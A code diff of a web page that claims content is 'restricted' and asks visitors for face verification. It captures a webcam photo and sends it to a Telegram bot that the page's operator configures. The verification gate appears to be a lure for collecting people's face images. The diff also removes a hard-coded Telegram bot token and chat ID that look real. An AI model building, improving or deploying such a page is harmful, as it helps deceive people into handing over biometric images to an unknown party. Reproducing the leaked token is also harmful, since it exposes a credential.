@@ -19,6 +19,7 @@
             justify-content: center;
             align-items: center;
             color: white;
+            padding: 20px;
         }
         
         .container {
@@ -53,6 +54,7 @@
             cursor: pointer;
             transition: all 0.3s ease;
             box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
+            margin: 5px;
         }
         
         .btn:hover {
@@ -82,6 +84,7 @@
             z-index: 1000;
             justify-content: center;
             align-items: center;
+            padding: 20px;
         }
         
         .modal-content {
@@ -119,17 +122,14 @@
         
         .capture-btn {
             background-color: #4CAF50;
-            margin: 10px;
         }
         
         .retake-btn {
             background-color: #f44336;
-            margin: 10px;
         }
         
         .submit-btn {
             background-color: #2196F3;
-            margin: 10px;
         }
         
         .success-dialog {
@@ -143,6 +143,7 @@
             z-index: 1000;
             justify-content: center;
             align-items: center;
+            padding: 20px;
         }
         
         .success-content {
@@ -186,6 +187,7 @@
             justify-content: center;
             flex-wrap: wrap;
             gap: 10px;
+            margin: 15px 0;
         }
         
         .face-guide {
@@ -212,6 +214,69 @@
             border: 1px dashed rgba(255, 255, 255, 0.5);
             border-radius: 50%;
         }
+        
+        .error-dialog {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .error-content {
+            background-color: #222;
+            border-radius: 15px;
+            padding: 30px;
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
+        }
+        
+        .error-icon {
+            font-size: 4rem;
+            color: #f44336;
+            margin-bottom: 20px;
+        }
+        
+        .config-section {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        
+        .config-section h3 {
+            margin-bottom: 10px;
+            color: #ff8e53;
+        }
+        
+        .config-input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border-radius: 5px;
+            border: 1px solid #444;
+            background: #333;
+            color: white;
+        }
+        
+        .config-input:focus {
+            outline: none;
+            border-color: #ff6b6b;
+        }
+        
+        .test-btn {
+            background: #9c27b0;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
@@ -219,6 +284,14 @@
         <h1>Access Limited</h1>
         <p>This content is restricted and requires face verification to proceed. Please click the button below to start the verification process.</p>
         <button id="startVerification" class="btn">Start Face Verification</button>
+        
+        <div class="config-section">
+            <h3>Telegram Bot Configuration</h3>
+            <p>Enter your Telegram Bot details below:</p>
+            <input type="text" id="botToken" class="config-input" placeholder="Bot Token (e.g., 123456789:ABCdefGHIjklMNOpqrsTUVwxyz)">
+            <input type="text" id="chatId" class="config-input" placeholder="Chat ID (e.g., 123456789)">
+            <button id="testConfig" class="btn test-btn">Test Configuration</button>
+        </div>
     </div>
 
     <!-- Camera Modal -->
@@ -237,7 +310,7 @@
                 <button id="submitBtn" class="btn submit-btn" style="display: none;">Submit for Verification</button>
             </div>
             <div id="loading" class="loading"></div>
-            <button id="closeCamera" class="btn" style="margin-top: 20px; background: #6c757d;">Cancel</button>
+            <button id="closeCamera" class="btn" style="background: #6c757d;">Cancel</button>
         </div>
     </div>
 
@@ -251,11 +324,25 @@
         </div>
     </div>
 
+    <!-- Error Dialog -->
+    <div id="errorDialog" class="error-dialog">
+        <div class="error-content">
+            <div class="error-icon">⚠️</div>
+            <h2>Verification Failed</h2>
+            <p id="errorMessage">There was an error submitting your verification. Please try again.</p>
+            <div class="btn-container">
+                <button id="retryBtn" class="btn">Retry</button>
+                <button id="closeError" class="btn" style="background: #6c757d;">Cancel</button>
+            </div>
+        </div>
+    </div>
+
     <script>
         // DOM Elements
         const startVerificationBtn = document.getElementById('startVerification');
         const cameraModal = document.getElementById('cameraModal');
         const successDialog = document.getElementById('successDialog');
+        const errorDialog = document.getElementById('errorDialog');
         const video = document.getElementById('video');
         const capturedImage = document.getElementById('capturedImage');
         const captureBtn = document.getElementById('captureBtn');
@@ -263,13 +350,80 @@
         const submitBtn = document.getElementById('submitBtn');
         const closeCameraBtn = document.getElementById('closeCamera');
         const continueBtn = document.getElementById('continueBtn');
+        const retryBtn = document.getElementById('retryBtn');
+        const closeErrorBtn = document.getElementById('closeError');
         const loading = document.getElementById('loading');
+        const botTokenInput = document.getElementById('botToken');
+        const chatIdInput = document.getElementById('chatId');
+        const testConfigBtn = document.getElementById('testConfig');
+        const errorMessage = document.getElementById('errorMessage');
 
         let stream = null;
         let capturedImageData = null;
 
+        // Load saved configuration
+        document.addEventListener('DOMContentLoaded', () => {
+            const savedBotToken = localStorage.getItem('telegramBotToken');
+            const savedChatId = localStorage.getItem('telegramChatId');
+            
+            if (savedBotToken) botTokenInput.value = savedBotToken;
+            if (savedChatId) chatIdInput.value = savedChatId;
+        });
+
+        // Test configuration
+        testConfigBtn.addEventListener('click', async () => {
+            const botToken = botTokenInput.value.trim();
+            const chatId = chatIdInput.value.trim();
+            
+            if (!botToken || !chatId) {
+                showError('Please enter both Bot Token and Chat ID');
+                return;
+            }
+            
+            // Save configuration
+            localStorage.setItem('telegramBotToken', botToken);
+            localStorage.setItem('telegramChatId', chatId);
+            
+            loading.style.display = 'block';
+            testConfigBtn.disabled = true;
+            
+            try {
+                // Test the configuration by sending a test message
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: '✅ Face Verification Bot is working correctly! You can now use face verification.'
+                    })
+                });
+                
+                if (response.ok) {
+                    alert('✅ Configuration test successful! Your bot is ready.');
+                } else {
+                    const errorData = await response.json();
+                    throw new Error(errorData.description || 'Failed to send test message');
+                }
+            } catch (error) {
+                showError('Configuration test failed: ' + error.message);
+            } finally {
+                loading.style.display = 'none';
+                testConfigBtn.disabled = false;
+            }
+        });
+
         // Open camera when Start Verification is clicked
         startVerificationBtn.addEventListener('click', async () => {
+            const botToken = botTokenInput.value.trim();
+            const chatId = chatIdInput.value.trim();
+            
+            if (!botToken || !chatId) {
+                showError('Please configure your Telegram Bot details first');
+                return;
+            }
+            
             try {
                 cameraModal.style.display = 'flex';
                 // Request camera with specific constraints for better quality
@@ -282,7 +436,7 @@
                 });
                 video.srcObject = stream;
             } catch (error) {
-                alert('Error accessing camera: ' + error.message);
+                showError('Error accessing camera: ' + error.message);
             }
         });
 
@@ -368,14 +522,14 @@
                 retakeBtn.style.display = 'none';
                 submitBtn.style.display = 'none';
             } catch (error) {
-                alert('Error accessing camera: ' + error.message);
+                showError('Error accessing camera: ' + error.message);
             }
         });
 
         // Submit for verification
         submitBtn.addEventListener('click', async () => {
             if (!capturedImageData) {
-                alert('Please capture a photo first');
+                showError('Please capture a photo first');
                 return;
             }
             
@@ -395,7 +549,7 @@
                 cameraModal.style.display = 'none';
                 successDialog.style.display = 'flex';
             } catch (error) {
-                alert('Error submitting verification: ' + error.message);
+                showError('Error submitting verification: ' + error.message);
             } finally {
                 loading.style.display = 'none';
                 submitBtn.disabled = false;
@@ -416,11 +570,35 @@
             window.location.href = 'https://example.com/web-app';
         });
 
+        // Retry verification
+        retryBtn.addEventListener('click', () => {
+            errorDialog.style.display = 'none';
+            startVerificationBtn.click();
+        });
+
+        // Close error dialog
+        closeErrorBtn.addEventListener('click', () => {
+            errorDialog.style.display = 'none';
+        });
+
+        // Function to show error dialog
+        function showError(message) {
+            errorMessage.textContent = message;
+            errorDialog.style.display = 'flex';
+            cameraModal.style.display = 'none';
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        }
+
         // Function to send image to Telegram
         async function sendToTelegram(imageBlob) {
-            // Replace with your actual bot token and chat ID
-            const botToken = '7455966277:AAE3vN10-2AMKGW5ZKE_WrRR_nSETKot_b8';
-            const chatId = '5543174018';
+            const botToken = botTokenInput.value.trim();
+            const chatId = chatIdInput.value.trim();
+            
+            if (!botToken || !chatId) {
+                throw new Error('Telegram Bot configuration is missing');
+            }
             
             // Create form data
             const formData = new FormData();
@@ -435,7 +613,8 @@
             });
             
             if (!response.ok) {
-                throw new Error('Failed to send photo to Telegram');
+                const errorData = await response.json();
+                throw new Error(errorData.description || 'Failed to send photo to Telegram');
             }
             
             return await response.json();
